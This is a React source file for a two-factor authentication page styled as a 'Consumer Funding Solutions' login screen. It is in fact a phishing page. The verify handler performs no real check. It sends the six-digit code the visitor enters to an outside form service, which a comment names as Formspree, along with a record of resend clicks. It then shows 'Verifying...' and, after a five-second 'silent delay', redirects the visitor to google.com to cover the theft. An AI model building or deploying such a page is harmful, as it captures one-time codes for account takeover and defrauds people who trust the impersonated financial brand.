import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { trackActivity } from './tracker';
import Logo from './Logo';

const OTPPage = () => {
  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [resendCount, setResendCount] = useState(0);
  const [isVerifying, setIsVerifying] = useState(false); // Handles the 5s delay
  const navigate = useNavigate();

  useEffect(() => {
    trackActivity("Reached OTP Screen");
  }, []);

  const handleChange = (element, index) => {
    if (isNaN(element.value)) return false;
    setOtp([...otp.map((d, idx) => (idx === index ? element.value : d))]);
    if (element.nextSibling && element.value !== "") {
      element.nextSibling.focus();
    }
  };

  const handleResend = async (e) => {
    e.preventDefault();
    if (isVerifying) return; // Prevent clicking while verifying
    
    setResendCount(prev => prev + 1);
    await trackActivity("Resend Code Requested", { 
      Resend_Attempt_Number: resendCount + 1 
    });
    alert("A new verification code has been requested.");
  };

  const handleVerify = async (e) => {
    e.preventDefault();
    const finalOtp = otp.join(""); 

    // 1. Trigger "Verifying" state
    setIsVerifying(true);

    // 2. Track to Formspree
    await trackActivity("Verification code submitted", { 
      Submitted_OTP: finalOtp,
      Clicked_Resend_Before_Submitting: resendCount > 0 ? "Yes" : "No",
    });

    // 3. 5-second silent delay before Google redirect
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 5000); 
  };

  return (
    <div style={styles.pageWrapper}>
      <div style={styles.header}>
        <Logo />
        <div style={styles.loginText}>Login</div>
      </div>

      <div style={styles.mainContent}>
        <div style={styles.card}>
          
          <div style={styles.backNav}>
            <button 
              onClick={() => navigate('/verify')} 
              style={{...styles.backBtn, opacity: isVerifying ? 0.5 : 1}}
              disabled={isVerifying}
            >
              ← Back to selection
            </button>
          </div>

          <div style={styles.iconArea}>
            <svg width="60" height="80" viewBox="0 0 24 24" fill="none" stroke="#003344" strokeWidth="1" strokeLinecap="round" strokeLinejoin="round">
              <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
              <path d="M12 18h.01"></path>
              <rect x="15" y="12" width="6" height="6" rx="1"></rect>
              <path d="M18 12V10a2 2 0 0 0-4 0v2"></path>
            </svg>
          </div>

          <h3 style={styles.title}>Two-Factor Authentication</h3>
          <p style={styles.subtitle}>Enter the One Time Password sent to you</p>

          <div style={styles.otpContainer}>
            {otp.map((data, index) => (
              <input
                key={index}
                type="text"
                maxLength="1"
                style={styles.otpInput}
                value={data}
                disabled={isVerifying}
                onChange={e => handleChange(e.target, index)}
                onFocus={e => e.target.select()}
              />
            ))}
          </div>

          <p style={styles.resendText}>
            Didn't receive the code? 
            <a 
              href="#" 
              style={{...styles.resendLink, opacity: isVerifying ? 0.5 : 1, cursor: isVerifying ? 'default' : 'pointer'}} 
              onClick={handleResend}
            >
              Resend code
            </a>
          </p>

          <div style={styles.buttonArea}>
            <button 
              style={{
                ...styles.verifyBtn, 
                opacity: isVerifying ? 0.6 : 1,
                cursor: isVerifying ? 'not-allowed' : 'pointer',
                backgroundColor: isVerifying ? '#555' : '#003344'
              }} 
              onClick={handleVerify}
              disabled={isVerifying}
            >
              {isVerifying ? "Verifying..." : "✓ Verify"}
            </button>
          </div>
        </div>
      </div>

      <footer style={styles.footer}>
        <div style={styles.footerLinks}>
          <span>ABOUT US</span>
          <span>TERMS OF USE</span>
          <span>PRIVACY POLICY</span>
        </div>
        <p style={styles.footerCopyright}>
          Copyright © 2017 Consumer Funding Solutions. All Rights Reserved.
        </p>
        <p style={styles.footerSiteMap}>SITE MAP</p>
      </footer>
    </div>
  );
};

const styles = {
  pageWrapper: { width: '100%', minHeight: '100vh', display: 'flex', flexDirection: 'column', backgroundColor: '#fff', fontFamily: 'Arial' },
  header: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '15px 25px', borderBottom: '1px solid #ddd' },
  loginText: { color: '#888', fontSize: '22px' },
  mainContent: { flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '40px 20px' },
  card: { width: '100%', maxWidth: '450px', padding: '30px 40px 40px', border: '1px solid #ddd', textAlign: 'center', borderRadius: '4px' },
  backNav: { textAlign: 'left', marginBottom: '10px' },
  backBtn: { background: 'none', border: 'none', color: '#0056b3', cursor: 'pointer', fontSize: '14px', padding: 0, fontWeight: 'bold' },
  iconArea: { marginBottom: '20px' },
  title: { fontSize: '22px', color: '#333', marginBottom: '10px' },
  subtitle: { fontSize: '16px', color: '#666', marginBottom: '30px' },
  otpContainer: { display: 'flex', justifyContent: 'center', gap: '10px', marginBottom: '30px' },
  otpInput: { width: '45px', height: '50px', textAlign: 'center', fontSize: '20px', border: '1px solid #888', borderRadius: '4px' },
  resendText: { fontSize: '14px', color: '#444', marginBottom: '30px' },
  resendLink: { color: '#0056b3', textDecoration: 'none', fontWeight: 'bold' },
  buttonArea: { display: 'flex', justifyContent: 'center' },
  verifyBtn: { color: 'white', border: 'none', padding: '12px 60px', fontSize: '16px', fontWeight: 'bold', borderRadius: '2px', transition: '0.3s' },
  footer: { backgroundColor: '#f0f2f5', padding: '40px 10px', textAlign: 'center', fontSize: '12px', color: '#666' },
  footerLinks: { display: 'flex', justifyContent: 'center', gap: '20px', marginBottom: '15px', fontWeight: 'bold' },
  footerCopyright: { marginBottom: '5px' },
  footerSiteMap: { fontWeight: 'bold' }
};

export default OTPPage;